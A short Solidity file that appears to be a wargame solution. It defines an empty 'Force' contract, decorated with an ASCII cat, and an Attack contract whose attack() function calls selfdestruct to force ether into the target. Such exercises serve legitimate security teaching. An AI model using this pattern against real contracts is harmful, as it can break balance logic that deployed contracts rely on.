// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Attack {
    Force public ForceContract;

    constructor(address ForceContractAddress) payable {
        ForceContract = Force(ForceContractAddress);
    }

    function attack() public payable {
        address payable addr = payable(address(ForceContract));
        selfdestruct(addr);
    }
}